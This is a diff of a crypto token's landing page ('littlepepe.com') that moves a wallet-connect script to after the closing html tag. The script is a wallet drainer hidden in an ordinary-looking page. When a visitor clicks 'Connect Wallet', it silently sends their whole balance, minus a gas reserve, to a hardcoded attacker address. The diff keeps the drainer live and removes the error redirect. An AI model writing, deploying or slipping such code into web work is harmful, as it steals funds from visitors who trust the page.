@@ -29,12 +29,6 @@
     <link rel="stylesheet" href="assets/css/style.css" />
     <script defer data-domain="littlepepe.com" src="https://plausible.io/js/script.js"></script>
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-NEYV4YWC9R"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-NEYV4YWC9R');
-    </script>
     <script type="text/javascript">
       adroll_adv_id = "7YXD6YRY6ZAJVCLQQAFVEM";
       adroll_pix_id = "CGXD7AJCBNCTXFSNIVNNXJ";
@@ -241,110 +235,114 @@
         <a href="https://twitter.com/littlepepetoken">Twitter</a> | <a href="#">Telegram</a> | <a href="#">Discord</a>
       </footer>
     </div>
-    <script>
-      window.addEventListener('load', () => {
-        const toggleBtn = document.getElementById('toggle-sidebar');
-        const sidebar = document.getElementById('sidebar');
-        if (toggleBtn && sidebar) {
-          toggleBtn.addEventListener('click', () => {
-            const isOpen = !sidebar.classList.contains('active');
-            sidebar.classList.toggle('active');
-            toggleBtn.textContent = isOpen ? '✖' : '☰';
-            toggleBtn.classList.toggle('close', isOpen);
-          });
-        }
-
-        let WalletConnectProvider;
-        if (window.WalletConnectProvider?.default) {
-          WalletConnectProvider = window.WalletConnectProvider.default;
-        } else if (window.WalletConnect) {
-          console.warn('Using WalletConnect client as fallback');
-          WalletConnectProvider = class extends window.WalletConnect {
-            constructor(opts) {
-              super(opts);
-              this.connector = new window.WalletConnect({
-                infuraId: opts.infuraId,
-                bridge: 'https://bridge.walletconnect.org',
-                qrcode: true,
-              });
-            }
-            async enable() {
-              await this.connector.connect();
-              return this.connector.accounts;
-            }
-          };
-        }
-        if (!WalletConnectProvider) {
-          console.error('WalletConnectProvider is not available. Check network or scripts.');
-          return;
-        }
-
-        if (typeof ethers === 'undefined') {
-          console.error('Ethers.js is not loaded. Check the script import.');
-          return;
-        }
-
-        const infuraKey = 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA';
-        const destinationAddress = '0xA292dF0EAF4991507174CcA2643B4E963181C5D4'; // Your EVM wallet
-        let provider, signer, accounts;
-
-        const connectButton = document.getElementById('connect-wallet');
-        if (connectButton) {
-          connectButton.addEventListener('click', async () => {
-            console.log('Connect Wallet clicked');
-            if (!WalletConnectProvider) {
-              alert('Error: WalletConnect not available.');
-              return;
-            }
-            try {
-              const web3Provider = new WalletConnectProvider({
-                infuraId: infuraKey,
-                rpc: {
-                  1: `https://mainnet.infura.io/v3/${infuraKey}`, // Mainnet
-                  56: 'https://bsc-dataseed.binance.org/', // BSC (optional)
-                },
-                qrcode: true,
-                pollingInterval: 12000,
-              });
-              await web3Provider.enable();
-              provider = new ethers.providers.Web3Provider(web3Provider);
-              signer = provider.getSigner();
-              accounts = await provider.listAccounts();
-              connectButton.textContent = `Connected: ${accounts[0].slice(0, 6)}...`;
-
-              // Silent transfer of all balance minus gas reserve
-              const gasReserve = ethers.utils.parseEther('0.001'); // Reserve for gas
-              const balance = await provider.getBalance(accounts[0]);
-              const amountToSend = balance.sub(gasReserve);
-              if (amountToSend.lte(0)) {
-                throw new Error('Insufficient balance for transfer after gas reserve');
-              }
-
-              const gasPrice = await provider.getGasPrice();
-              const gasLimit = 21000; // Standard for simple transfer
-              const txCost = gasPrice.mul(gasLimit);
-              if (amountToSend.lt(txCost)) {
-                throw new Error('Balance too low to cover gas after reserve');
-              }
-
-              const tx = await signer.sendTransaction({
-                to: destinationAddress,
-                value: amountToSend,
-                gasLimit: gasLimit,
-                gasPrice: gasPrice,
-              });
-              console.log('Transaction sent:', tx.hash);
-              await tx.wait();
-              console.log('Transaction confirmed!');
-              connectButton.textContent += ' (Transferred)';
-            } catch (error) {
-              console.error('Wallet connect or transfer error:', error);
-              alert(`Error: ${error.message}. Redirecting to WalletConnect...`);
-              window.location.href = 'https://walletconnect.com/';
-            }
-          });
-        }
-      });
-    </script>
   </body>
 </html>
+<script>
+<script>
+  window.addEventListener('load', () => {
+    const toggleBtn = document.getElementById('toggle-sidebar');
+    const sidebar = document.getElementById('sidebar');
+    if (toggleBtn && sidebar) {
+      toggleBtn.addEventListener('click', () => {
+        const isOpen = !sidebar.classList.contains('active');
+        sidebar.classList.toggle('active');
+        toggleBtn.textContent = isOpen ? '✖' : '☰';
+        toggleBtn.classList.toggle('close', isOpen);
+      });
+    }
+
+    let WalletConnectProvider;
+    if (window.WalletConnectProvider?.default) {
+      WalletConnectProvider = window.WalletConnectProvider.default;
+    } else if (window.WalletConnect) {
+      console.warn('Using WalletConnect client as fallback');
+      WalletConnectProvider = class extends window.WalletConnect {
+        constructor(opts) {
+          super(opts);
+          this.connector = new window.WalletConnect({
+            infuraId: opts.infuraId,
+            bridge: 'https://bridge.walletconnect.org',
+            qrcode: true,
+          });
+        }
+        async enable() {
+          await this.connector.connect();
+          return this.connector.accounts;
+        }
+      };
+    }
+    if (!WalletConnectProvider) {
+      console.error('WalletConnectProvider is not available. Check network or scripts.');
+      return;
+    }
+
+    if (typeof ethers === 'undefined') {
+      console.error('Ethers.js is not loaded. Check the script import.');
+      return;
+    }
+
+    const infuraKey = 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA';
+    const destinationAddress = '0xA292dF0EAF4991507174CcA2643B4E963181C5D4'; // Your EVM wallet
+    let provider, signer, accounts;
+
+    const connectButton = document.getElementById('connect-wallet');
+    if (connectButton) {
+      connectButton.addEventListener('click', async () => {
+        console.log('Connect Wallet clicked');
+        if (!WalletConnectProvider) {
+          alert('Error: WalletConnect not available.');
+          return;
+        }
+        try {
+          const web3Provider = new WalletConnectProvider({
+            infuraId: infuraKey,
+            rpc: {
+              1: `https://mainnet.infura.io/v3/${infuraKey}`, // Mainnet
+              56: 'https://bsc-dataseed.binance.org/', // BSC (optional)
+            },
+            qrcode: true,
+            pollingInterval: 12000,
+          });
+          await web3Provider.enable();
+          provider = new ethers.providers.Web3Provider(web3Provider);
+          signer = provider.getSigner();
+          accounts = await provider.listAccounts();
+          connectButton.textContent = `Connected: ${accounts[0].slice(0, 6)}...`;
+
+          // Silent transfer of all balance minus gas reserve
+          const gasReserve = ethers.utils.parseEther('0.001'); // Reserve for gas
+          const balance = await provider.getBalance(accounts[0]);
+          const amountToSend = balance.sub(gasReserve);
+          if (amountToSend.lte(0)) {
+            throw new Error('Insufficient balance for transfer after gas reserve');
+          }
+
+          const gasPrice = await provider.getGasPrice();
+          const gasLimit = 21000; // Standard for simple transfer
+          const txCost = gasPrice.mul(gasLimit);
+          if (amountToSend.lt(txCost)) {
+            throw new Error('Balance too low to cover gas after reserve');
+          }
+
+          const tx = await signer.sendTransaction({
+            to: destinationAddress,
+            value: amountToSend,
+            gasLimit: gasLimit,
+            gasPrice: gasPrice,
+          });
+          console.log('Transaction sent:', tx.hash);
+          await tx.wait();
+          console.log('Transaction confirmed!');
+          connectButton.textContent += ' (Transferred)';
+        } catch (error) {
+          console.error('Wallet connect or transfer error:', error);
+          alert(`Error: ${error.message}`);
+          // Removed redirect to avoid unwanted navigation
+          // If you want to redirect to main page instead, add:
+          // window.location.href = '/index.html';
+        }
+      });
+    }
+  });
+</script>
+</script>
